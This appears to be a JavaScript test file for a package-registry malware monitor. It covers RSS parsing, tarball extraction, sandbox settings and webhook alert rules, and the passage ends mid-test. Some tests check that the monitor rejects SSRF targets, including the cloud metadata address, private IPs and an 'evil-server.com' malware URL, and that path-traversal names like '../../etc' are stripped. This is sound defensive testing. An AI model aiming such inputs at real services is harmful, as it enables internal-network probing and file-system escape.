const fs = require('fs');
const path = require('path');
const os = require('os');
const { execSync } = require('child_process');
const {
  test, asyncTest, assert, assertIncludes, assertNotIncludes,
  runScan, runCommand, BIN, TESTS_DIR, addSkipped
} = require('../test-utils');

async function runMonitorTests() {
  // ============================================
  // MONITOR TESTS
  // ============================================

  console.log('\n=== MONITOR TESTS ===\n');

  const {
    parseNpmRss, parsePyPIRss, loadState, saveState, STATE_FILE,
    ALERTS_FILE, extractTarGz, getNpmTarballUrl, getNpmLatestTarball, scanQueue, processQueue,
    appendAlert, timeoutPromise, stats, dailyAlerts, MAX_TARBALL_SIZE,
    KNOWN_BUNDLED_FILES, isBundledToolingOnly,
    isSandboxEnabled, hasHighOrCritical,
    getWebhookUrl, shouldSendWebhook, buildMonitorWebhookPayload,
    computeRiskLevel, computeRiskScore, buildDailyReportEmbed,
    DAILY_REPORT_HOUR, isDailyReportDue, getParisHour, getParisDateString,
    isTemporalEnabled, buildTemporalWebhookEmbed,
    isTemporalAstEnabled, buildTemporalAstWebhookEmbed,
    isTemporalPublishEnabled, buildPublishAnomalyWebhookEmbed,
    isTemporalMaintainerEnabled, buildMaintainerChangeWebhookEmbed,
    isCanaryEnabled, buildCanaryExfiltrationWebhookEmbed,
    getTemporalMaxSeverity, isPublishAnomalyOnly,
    isVerboseMode, setVerboseMode, hasIOCMatch, IOC_MATCH_TYPES,
    DETECTIONS_FILE, appendDetection, loadDetections, getDetectionStats,
    SCAN_STATS_FILE, loadScanStats, updateScanStats,
    buildReportFromDisk, buildReportEmbedFromDisk, getReportStatus,
    buildAlertData, trySendWebhook, classifyError, recordError, formatErrorBreakdown,
    cleanupOrphanTmpDirs, sendReportNow,
    consecutivePollErrors, POLL_MAX_BACKOFF,
    runTemporalAstCheck, runTemporalPublishCheck, runTemporalMaintainerCheck,
    runTemporalCheck, reportStats, recentlyScanned, sendDailyReport,
    resolveTarballAndScan, alertedPackageRules, KNOWN_BUNDLED_PATHS,
    LAST_DAILY_REPORT_FILE,
    loadLastDailyReportDate, saveLastDailyReportDate, hasReportBeenSentToday,
    DAILY_STATS_FILE, DAILY_STATS_PERSIST_INTERVAL,
    loadDailyStats, saveDailyStats, resetDailyStats, maybePersistDailyStats,
    isSafeLifecycleScript,
    getWeeklyDownloads, hasTyposquat, isSuspectClassification, formatFindings,
    TIER1_TYPES, TIER2_ACTIVE_TYPES, TIER3_PASSIVE_TYPES,
    POPULAR_THRESHOLD, downloadsCache, DOWNLOADS_CACHE_TTL,
    ALERTS_LOG_DIR, DAILY_REPORTS_LOG_DIR, resolveWritableDir,
    atomicWriteFileSync,
    SELF_PACKAGE_NAME,
    computeReputationFactor,
    HIGH_CONFIDENCE_MALICE_TYPES,
    hasHighConfidenceThreat,
    getWebhookThreshold,
    extractScope,
    pendingGrouped,
    bufferScopedWebhook,
    flushScopeGroup,
    SCOPE_GROUP_WINDOW_MS
  } = require('../../src/monitor.js');

  test('MONITOR: parseNpmRss extracts package names from RSS', () => {
    const xml = `<?xml version="1.0"?>
<rss version="2.0">
  <channel>
    <title>npm new packages</title>
    <item>
      <title>my-package 1.2.3</title>
      <link>https://www.npmjs.com/package/my-package</link>
    </item>
    <item>
      <title>another-pkg 0.0.1</title>
      <link>https://www.npmjs.com/package/another-pkg</link>
    </item>
  </channel>
</rss>`;
    const packages = parseNpmRss(xml);
    assert(packages.length === 2, 'Should find 2 packages, got ' + packages.length);
    assert(packages[0] === 'my-package', 'First should be my-package, got ' + packages[0]);
    assert(packages[1] === 'another-pkg', 'Second should be another-pkg');
  });

  test('MONITOR: parseNpmRss handles empty RSS', () => {
    const xml = `<?xml version="1.0"?><rss><channel></channel></rss>`;
    const packages = parseNpmRss(xml);
    assert(packages.length === 0, 'Should return empty for no items');
  });

  test('MONITOR: parseNpmRss handles malformed XML gracefully', () => {
    const packages = parseNpmRss('not xml at all');
    assert(packages.length === 0, 'Should return empty for invalid XML');
  });

  test('MONITOR: parseNpmRss extracts name only (strips version)', () => {
    const xml = `<rss><channel>
    <item><title>scoped-pkg 2.0.0-beta.1</title></item>
    <item><title>simple</title></item>
  </channel></rss>`;
    const packages = parseNpmRss(xml);
    assert(packages.length === 2, 'Should find 2 packages');
    assert(packages[0] === 'scoped-pkg', 'Should extract name before version');
    assert(packages[1] === 'simple', 'Should handle title with no version');
  });

  test('MONITOR: parsePyPIRss extracts package names from RSS', () => {
    const xml = `<?xml version="1.0"?>
<rss version="2.0">
  <channel>
    <title>Newest packages</title>
    <item>
      <title>cool-lib 2.0.0</title>
      <link>https://pypi.org/project/cool-lib/2.0.0/</link>
    </item>
    <item>
      <title>another-pkg 0.1.0</title>
      <link>https://pypi.org/project/another-pkg/0.1.0/</link>
    </item>
  </channel>
</rss>`;
    const packages = parsePyPIRss(xml);
    assert(packages.length === 2, 'Should find 2 packages, got ' + packages.length);
    assert(packages[0] === 'cool-lib', 'First should be cool-lib, got ' + packages[0]);
    assert(packages[1] === 'another-pkg', 'Second should be another-pkg');
  });

  test('MONITOR: parsePyPIRss handles empty RSS', () => {
    const xml = `<?xml version="1.0"?><rss><channel></channel></rss>`;
    const packages = parsePyPIRss(xml);
    assert(packages.length === 0, 'Should return empty for no items');
  });

  test('MONITOR: parsePyPIRss handles malformed XML gracefully', () => {
    const packages = parsePyPIRss('not xml at all');
    assert(packages.length === 0, 'Should return empty for invalid XML');
  });

  test('MONITOR: state save and restore round-trip', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-monitor-'));
    const tmpState = path.join(tmpDir, 'monitor-state.json');
    const origFile = STATE_FILE;

    // Write state to temp file
    const testState = { npmLastPackage: 'test-npm-pkg', pypiLastPackage: 'test-pkg' };
    fs.writeFileSync(tmpState, JSON.stringify(testState), 'utf8');

    // Read it back manually (loadState uses STATE_FILE, so we test the format)
    const raw = fs.readFileSync(tmpState, 'utf8');
    const restored = JSON.parse(raw);
    assert(restored.npmLastPackage === 'test-npm-pkg', 'npmLastPackage should round-trip');
    assert(restored.pypiLastPackage === 'test-pkg', 'pypiLastPackage should round-trip');

    // Cleanup
    try { fs.unlinkSync(tmpState); fs.rmdirSync(tmpDir); } catch {}
  });

  test('MONITOR: loadState returns defaults when file missing', () => {
    // loadState reads STATE_FILE which may not exist in test env
    // We test that it doesn't throw and returns defaults
    const state = loadState();
    assert(typeof state.npmLastPackage === 'string', 'npmLastPackage should be string');
    assert(typeof state.pypiLastPackage === 'string', 'pypiLastPackage should be string');
  });

  // ============================================
  // MONITOR PHASE 2 TESTS
  // ============================================

  console.log('\n=== MONITOR PHASE 2 TESTS ===\n');

  test('MONITOR: getNpmLatestTarball is exported and is a function', () => {
    assert(typeof getNpmLatestTarball === 'function', 'getNpmLatestTarball should be a function');
  });

  test('MONITOR: scanQueue FIFO ordering', () => {
    // Clear queue first
    scanQueue.length = 0;
    scanQueue.push({ name: 'first', version: '1.0.0', ecosystem: 'npm', tarballUrl: 'a' });
    scanQueue.push({ name: 'second', version: '2.0.0', ecosystem: 'npm', tarballUrl: 'b' });
    scanQueue.push({ name: 'third', version: '3.0.0', ecosystem: 'pypi', tarballUrl: 'c' });
    assert(scanQueue.length === 3, 'Queue should have 3 items');
    const item1 = scanQueue.shift();
    assert(item1.name === 'first', 'First shifted should be "first", got ' + item1.name);
    const item2 = scanQueue.shift();
    assert(item2.name === 'second', 'Second shifted should be "second", got ' + item2.name);
    const item3 = scanQueue.shift();
    assert(item3.name === 'third', 'Third shifted should be "third", got ' + item3.name);
    assert(scanQueue.length === 0, 'Queue should be empty');
  });

  test('MONITOR: getNpmTarballUrl extracts URL from pkg data', () => {
    const withDist = { dist: { tarball: 'https://example.com/pkg.tgz' } };
    assert(getNpmTarballUrl(withDist) === 'https://example.com/pkg.tgz', 'Should extract tarball URL');
    const noDist = { name: 'foo' };
    assert(getNpmTarballUrl(noDist) === null, 'Should return null when no dist');
    const emptyDist = { dist: {} };
    assert(getNpmTarballUrl(emptyDist) === null, 'Should return null when no tarball in dist');
  });

  if (process.platform !== 'win32') {
    test('MONITOR: extractTarGz returns extracted path', () => {
      const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-tar-test-'));
      const innerDir = path.join(tmpDir, 'source');
      const packageDir = path.join(innerDir, 'package');
      fs.mkdirSync(packageDir, { recursive: true });
      fs.writeFileSync(path.join(packageDir, 'index.js'), 'module.exports = {};\n');
      // Create a tar.gz from the source directory
      const tgzPath = path.join(tmpDir, 'test.tar.gz');
      try {
        const { execSync: es } = require('child_process');
        es(`tar czf "${tgzPath}" -C "${innerDir}" package`, { stdio: 'pipe' });
        const extractDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-extract-'));
        const result = extractTarGz(tgzPath, extractDir);
        // Should detect the package/ subdirectory
        assert(result.endsWith('package'), 'Should return path ending with package, got ' + result);
        assert(fs.existsSync(path.join(result, 'index.js')), 'Extracted dir should contain index.js');
        try { fs.rmSync(extractDir, { recursive: true, force: true }); } catch {}
      } finally {
        try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
      }
    });
  } else {
    console.log('[SKIP] extractTarGz: not supported on Windows');
    addSkipped(1);
  }

  // --- SSRF redirect protection tests ---

  const {
    isAllowedDownloadRedirect,
    sanitizePackageName
  } = require('../../src/shared/download.js');

  test('DOWNLOAD: isAllowedDownloadRedirect allows registry.npmjs.org', () => {
    const result = isAllowedDownloadRedirect('https://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz');
    assert(result.allowed === true, 'Should allow registry.npmjs.org');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect allows files.pythonhosted.org', () => {
    const result = isAllowedDownloadRedirect('https://files.pythonhosted.org/packages/source/p/pkg/pkg-1.0.0.tar.gz');
    assert(result.allowed === true, 'Should allow files.pythonhosted.org');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect blocks private IP 127.0.0.1', () => {
    const result = isAllowedDownloadRedirect('https://127.0.0.1/evil');
    assert(result.allowed === false, 'Should block 127.0.0.1');
    assertIncludes(result.error, 'private IP', 'Error should mention private IP');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect blocks private IP 169.254.x.x', () => {
    const result = isAllowedDownloadRedirect('https://169.254.169.254/latest/meta-data/');
    assert(result.allowed === false, 'Should block 169.254.x.x (cloud metadata)');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect blocks private IP 10.x.x.x', () => {
    const result = isAllowedDownloadRedirect('https://10.0.0.1/internal');
    assert(result.allowed === false, 'Should block 10.x.x.x');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect blocks private IP 192.168.x.x', () => {
    const result = isAllowedDownloadRedirect('https://192.168.1.1/internal');
    assert(result.allowed === false, 'Should block 192.168.x.x');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect blocks non-whitelisted domain', () => {
    const result = isAllowedDownloadRedirect('https://evil-server.com/malware.tar.gz');
    assert(result.allowed === false, 'Should block non-whitelisted domain');
    assertIncludes(result.error, 'not in allowlist', 'Error should mention allowlist');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect blocks HTTP (non-HTTPS)', () => {
    const result = isAllowedDownloadRedirect('http://registry.npmjs.org/pkg/-/pkg-1.0.0.tgz');
    assert(result.allowed === false, 'Should block HTTP');
    assertIncludes(result.error, 'non-HTTPS', 'Error should mention HTTPS');
  });

  test('DOWNLOAD: isAllowedDownloadRedirect blocks invalid URL', () => {
    const result = isAllowedDownloadRedirect('not a url');
    assert(result.allowed === false, 'Should block invalid URL');
  });

  test('DOWNLOAD: sanitizePackageName removes path traversal', () => {
    const r1 = sanitizePackageName('../../etc');
    assert(!r1.includes('..'), 'Should strip .. sequences, got: ' + r1);
    assert(sanitizePackageName('@scope/name') === 'scope_name', 'Should strip @ and /');
    assert(sanitizePackageName('simple-pkg') === 'simple-pkg', 'Should keep simple names');
    const r2 = sanitizePackageName('../../../tmp/evil');
    assert(!r2.includes('..'), 'Should strip all .. sequences, got: ' + r2);
  });

  test('MONITOR: appendAlert writes to file', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-alert-test-'));
    const tmpAlerts = path.join(tmpDir, 'alerts.json');
    try {
      // Manually test alert format (appendAlert uses ALERTS_FILE, so we test the logic)
      const alert1 = {
        timestamp: '2025-01-01T00:00:00.000Z',
        name: 'evil-pkg',
        version: '1.0.0',
        ecosystem: 'npm',
        findings: [{ rule: 'ast_dangerous_call', severity: 'HIGH', file: 'index.js' }]
      };
      const alert2 = {
        timestamp: '2025-01-01T00:01:00.000Z',
        name: 'bad-lib',
        version: '0.1.0',
        ecosystem: 'pypi',
        findings: [{ rule: 'shell_exec', severity: 'CRITICAL', file: 'setup.py' }]
      };
      // Write first alert
      fs.writeFileSync(tmpAlerts, JSON.stringify([alert1], null, 2), 'utf8');
      // Append second
      const existing = JSON.parse(fs.readFileSync(tmpAlerts, 'utf8'));
      existing.push(alert2);
      fs.writeFileSync(tmpAlerts, JSON.stringify(existing, null, 2), 'utf8');
      // Verify
      const result = JSON.parse(fs.readFileSync(tmpAlerts, 'utf8'));
      assert(result.length === 2, 'Should have 2 alerts, got ' + result.length);
      assert(result[0].name === 'evil-pkg', 'First alert should be evil-pkg');
      assert(result[1].name === 'bad-lib', 'Second alert should be bad-lib');
      assert(result[0].findings[0].rule === 'ast_dangerous_call', 'Should have rule field');
      assert(result[1].ecosystem === 'pypi', 'Should have ecosystem field');
    } finally {
      try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch {}
    }
  });

  test('MONITOR: getPyPITarballUrl parses JSON response', () => {
    // Test the parsing logic directly using the same structure getPyPITarballUrl expects
    const mockData = {
      info: { version: '3.2.1' },
      urls: [
        { packagetype: 'bdist_wheel', url: 'https://files.pythonhosted.org/pkg-3.2.1.whl' },
        { packagetype: 'sdist', url: 'https://files.pythonhosted.org/pkg-3.2.1.tar.gz' }
      ]
    };
    // Simulate the logic in getPyPITarballUrl
    const version = (mockData.info && mockData.info.version) || '';
    const urls = mockData.urls || [];
    const sdist = urls.find(u => u.packagetype === 'sdist' && u.url);
    assert(version === '3.2.1', 'Should extract version');
    assert(sdist, 'Should find sdist entry');
    assert(sdist.url === 'https://files.pythonhosted.org/pkg-3.2.1.tar.gz', 'Should get sdist URL');

    // Test fallback: no sdist, find .tar.gz
    const noSdist = {
      info: { version: '1.0.0' },
      urls: [
        { packagetype: 'bdist_wheel', url: 'https://example.com/pkg.whl' },
        { packagetype: 'bdist_egg', url: 'https://example.com/pkg.tar.gz' }
      ]
    };
    const noSdistUrls = noSdist.urls;
    const sdist2 = noSdistUrls.find(u => u.packagetype === 'sdist' && u.url);
    assert(!sdist2, 'Should not find sdist');
    const tarGz = noSdistUrls.find(u => u.url && u.url.endsWith('.tar.gz'));
    assert(tarGz, 'Should find .tar.gz fallback');
    assert(tarGz.url === 'https://example.com/pkg.tar.gz', 'Should get .tar.gz URL');
  });

  await asyncTest('MONITOR: timeoutPromise rejects after delay', async () => {
    const start = Date.now();
    try {
      await timeoutPromise(50); // 50ms timeout
      assert(false, 'Should have rejected');
    } catch (err) {
      const elapsed = Date.now() - start;
      assert(elapsed >= 40, 'Should have waited ~50ms, waited ' + elapsed);
      assert(err.message.includes('timeout'), 'Error should mention timeout, got: ' + err.message);
    }
  });

  test('MONITOR: stats object tracks counters', () => {
    // Verify stats has expected fields
    assert(typeof stats.scanned === 'number', 'stats.scanned should be number');
    assert(typeof stats.clean === 'number', 'stats.clean should be number');
    assert(typeof stats.suspect === 'number', 'stats.suspect should be number');
    assert(typeof stats.errors === 'number', 'stats.errors should be number');
    assert(typeof stats.totalTimeMs === 'number', 'stats.totalTimeMs should be number');
    assert(typeof stats.lastReportTime === 'number', 'stats.lastReportTime should be number');
  });

  // ============================================
  // MONITOR PHASE 3 TESTS (Sandbox Integration)
  // ============================================

  console.log('\n=== MONITOR PHASE 3 TESTS ===\n');

  test('MONITOR: hasHighOrCritical returns true for HIGH findings', () => {
    const result = { summary: { total: 3, critical: 0, high: 2, medium: 1, low: 0 } };
    assert(hasHighOrCritical(result) === true, 'Should return true when high > 0');
  });

  test('MONITOR: hasHighOrCritical returns true for CRITICAL findings', () => {
    const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 } };
    assert(hasHighOrCritical(result) === true, 'Should return true when critical > 0');
  });

  test('MONITOR: hasHighOrCritical returns false for LOW/MEDIUM only', () => {
    const result = { summary: { total: 5, critical: 0, high: 0, medium: 3, low: 2 } };
    assert(hasHighOrCritical(result) === false, 'Should return false when no HIGH/CRITICAL');
  });

  test('MONITOR: isSandboxEnabled defaults to true', () => {
    const orig = process.env.MUADDIB_MONITOR_SANDBOX;
    delete process.env.MUADDIB_MONITOR_SANDBOX;
    try {
      assert(isSandboxEnabled() === true, 'Should default to true when env not set');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = orig;
    }
  });

  test('MONITOR: isSandboxEnabled returns false when env=false', () => {
    const orig = process.env.MUADDIB_MONITOR_SANDBOX;
    process.env.MUADDIB_MONITOR_SANDBOX = 'false';
    try {
      assert(isSandboxEnabled() === false, 'Should return false when env is "false"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = orig;
      else delete process.env.MUADDIB_MONITOR_SANDBOX;
    }
  });

  test('MONITOR: isSandboxEnabled returns false when env=FALSE (case insensitive)', () => {
    const orig = process.env.MUADDIB_MONITOR_SANDBOX;
    process.env.MUADDIB_MONITOR_SANDBOX = 'FALSE';
    try {
      assert(isSandboxEnabled() === false, 'Should return false when env is "FALSE"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = orig;
      else delete process.env.MUADDIB_MONITOR_SANDBOX;
    }
  });

  test('MONITOR: isSandboxEnabled returns true when env=true', () => {
    const orig = process.env.MUADDIB_MONITOR_SANDBOX;
    process.env.MUADDIB_MONITOR_SANDBOX = 'true';
    try {
      assert(isSandboxEnabled() === true, 'Should return true when env is "true"');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = orig;
      else delete process.env.MUADDIB_MONITOR_SANDBOX;
    }
  });

  test('MONITOR: sandbox condition requires all three flags', () => {
    // Simulate the condition: hasHighOrCritical && isSandboxEnabled && sandboxAvailable
    const monitor = require('../../src/monitor.js');
    const highResult = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 } };
    const lowResult = { summary: { total: 2, critical: 0, high: 0, medium: 1, low: 1 } };

    // Case 1: HIGH findings, sandbox enabled, docker available -> should sandbox
    const origEnv = process.env.MUADDIB_MONITOR_SANDBOX;
    delete process.env.MUADDIB_MONITOR_SANDBOX;
    monitor.sandboxAvailable = true;
    const shouldSandbox1 = hasHighOrCritical(highResult) && isSandboxEnabled() && monitor.sandboxAvailable;
    assert(shouldSandbox1 === true, 'Should sandbox with HIGH + enabled + docker');

    // Case 2: LOW only findings -> no sandbox
    const shouldSandbox2 = hasHighOrCritical(lowResult) && isSandboxEnabled() && monitor.sandboxAvailable;
    assert(shouldSandbox2 === false, 'Should NOT sandbox with LOW/MEDIUM only');

    // Case 3: HIGH findings, sandbox disabled via env -> no sandbox
    process.env.MUADDIB_MONITOR_SANDBOX = 'false';
    const shouldSandbox3 = hasHighOrCritical(highResult) && isSandboxEnabled() && monitor.sandboxAvailable;
    assert(shouldSandbox3 === false, 'Should NOT sandbox when env=false');

    // Case 4: HIGH findings, sandbox enabled, docker unavailable -> no sandbox
    delete process.env.MUADDIB_MONITOR_SANDBOX;
    monitor.sandboxAvailable = false;
    const shouldSandbox4 = hasHighOrCritical(highResult) && isSandboxEnabled() && monitor.sandboxAvailable;
    assert(shouldSandbox4 === false, 'Should NOT sandbox when docker unavailable');

    // Restore
    if (origEnv !== undefined) process.env.MUADDIB_MONITOR_SANDBOX = origEnv;
  });

  test('MONITOR: alert includes sandbox field when sandbox result has score > 0', () => {
    const sandboxResult = {
      score: 60,
      severity: 'HIGH',
      findings: [{ type: 'suspicious_dns', severity: 'HIGH', detail: 'DNS to evil.com' }]
    };
    const alert = {
      timestamp: new Date().toISOString(),
      name: 'evil-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      findings: [{ rule: 'ast_dangerous_call', severity: 'HIGH', file: 'index.js' }]
    };
    // Simulate the condition in scanPackage
    if (sandboxResult && sandboxResult.score > 0) {
      alert.sandbox = {
        score: sandboxResult.score,
        severity: sandboxResult.severity,
        findings: sandboxResult.findings
      };
    }
    assert(alert.sandbox, 'Alert should have sandbox field');
    assert(alert.sandbox.score === 60, 'Sandbox score should be 60');
    assert(alert.sandbox.severity === 'HIGH', 'Sandbox severity should be HIGH');
    assert(alert.sandbox.findings.length === 1, 'Should have 1 sandbox finding');
  });

  test('MONITOR: alert has no sandbox field when score is 0', () => {
    const sandboxResult = { score: 0, severity: 'CLEAN', findings: [] };
    const alert = {
      timestamp: new Date().toISOString(),
      name: 'ok-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      findings: [{ rule: 'ast_dangerous_call', severity: 'HIGH', file: 'index.js' }]
    };
    if (sandboxResult && sandboxResult.score > 0) {
      alert.sandbox = {
        score: sandboxResult.score,
        severity: sandboxResult.severity,
        findings: sandboxResult.findings
      };
    }
    assert(!alert.sandbox, 'Alert should NOT have sandbox field when score=0');
  });

  // ============================================
  // MONITOR PHASE 4 TESTS (Webhook Alerting)
  // ============================================

  console.log('\n=== MONITOR PHASE 4 TESTS ===\n');

  test('MONITOR: getWebhookUrl returns null when env not set', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    try {
      assert(getWebhookUrl() === null, 'Should return null when env not set');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
    }
  });

  test('MONITOR: getWebhookUrl returns URL when env is set', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/services/T00/B00/xxx';
    try {
      assert(getWebhookUrl() === 'https://hooks.slack.com/services/T00/B00/xxx', 'Should return the URL');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns false when no URL configured', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    delete process.env.MUADDIB_WEBHOOK_URL;
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 } };
      assert(shouldSendWebhook(result, null) === false, 'Should return false without URL');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
    }
  });

  test('MONITOR: shouldSendWebhook returns false for HIGH findings without IOC match', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 2, critical: 0, high: 2, medium: 0, low: 0 }, threats: [
        { type: 'dangerous_call_eval', severity: 'HIGH' },
        { type: 'obfuscation_detected', severity: 'HIGH' }
      ] };
      assert(shouldSendWebhook(result, null) === false, 'Should return false for HIGH without IOC match');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for IOC match', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0 }, threats: [
        { type: 'known_malicious_package', severity: 'CRITICAL' }
      ] };
      assert(shouldSendWebhook(result, null) === true, 'Should return true for IOC match');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for sandbox score > 50', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 2, critical: 0, high: 0, medium: 2, low: 0 } };
      const sandbox = { score: 60, severity: 'HIGH', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true, 'Should return true for sandbox score > 50');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns false when sandbox score is 0 (false positive)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 2, critical: 1, high: 1, medium: 0, low: 0 } };
      const sandbox = { score: 0, severity: 'NONE', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === false, 'Should return false when sandbox clean (score 0)');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true when sandbox score > 30', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.slack.com/test';
    try {
      const result = { summary: { total: 2, critical: 0, high: 0, medium: 1, low: 1 } };
      const sandbox = { score: 35, severity: 'MEDIUM', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true, 'Should return true when sandbox score > 30');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true when static CRITICAL 100 but sandbox clean (dormant suspect)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      // Static score 100 CRITICAL — sandbox says CLEAN but high static = dormant suspect
      const result = { summary: { total: 5, critical: 4, high: 1, medium: 0, low: 0, riskScore: 100 }, threats: [
        { type: 'dangerous_call_eval', severity: 'CRITICAL' },
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'suspicious_dataflow', severity: 'CRITICAL' },
        { type: 'dynamic_require', severity: 'CRITICAL' },
        { type: 'prototype_hook', severity: 'HIGH' }
      ] };
      const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'High static score with sandbox clean should send webhook (dormant suspect)');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for CRITICAL static score when no sandbox', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 4, critical: 4, high: 0, medium: 0, low: 0, riskScore: 100 }, threats: [
        { type: 'dangerous_call_eval', severity: 'CRITICAL' },
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'suspicious_dataflow', severity: 'CRITICAL' },
        { type: 'dynamic_require', severity: 'CRITICAL' }
      ] };
      assert(shouldSendWebhook(result, null) === true,
        'Should send webhook for CRITICAL static score when sandbox unavailable');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook returns true for sandbox score 10 with high static (dormant suspect)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 3, critical: 3, high: 0, medium: 0, low: 0, riskScore: 75 }, threats: [
        { type: 'dangerous_call_eval', severity: 'CRITICAL' },
        { type: 'obfuscation_detected', severity: 'CRITICAL' },
        { type: 'suspicious_dataflow', severity: 'CRITICAL' }
      ] };
      const sandbox = { score: 10, severity: 'LOW', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'High static score with low sandbox should send webhook (dormant suspect)');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  // --- shouldSendWebhook: IOC + sandbox combinations (BUGs 1-3) ---

  test('MONITOR: shouldSendWebhook sends for IOC match + sandbox CLEAN (score 0)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0, riskScore: 25 }, threats: [
        { type: 'known_malicious_package', severity: 'CRITICAL' }
      ] };
      const sandbox = { score: 0, severity: 'CLEAN', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'IOC match must ALWAYS send, even when sandbox is clean');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
      else delete process.env.MUADDIB_WEBHOOK_URL;
    }
  });

  test('MONITOR: shouldSendWebhook sends for IOC match + sandbox timeout noise (score 10)', () => {
    const orig = process.env.MUADDIB_WEBHOOK_URL;
    process.env.MUADDIB_WEBHOOK_URL = 'https://hooks.example.com/test';
    try {
      const result = { summary: { total: 1, critical: 1, high: 0, medium: 0, low: 0, riskScore: 25 }, threats: [
        { type: 'known_malicious_package', severity: 'CRITICAL' }
      ] };
      const sandbox = { score: 10, severity: 'LOW', findings: [] };
      assert(shouldSendWebhook(result, sandbox) === true,
        'IOC match must send even with timeout noise sandbox score');
    } finally {
      if (orig !== undefined) process.env.MUADDIB_WEBHOOK_URL = orig;
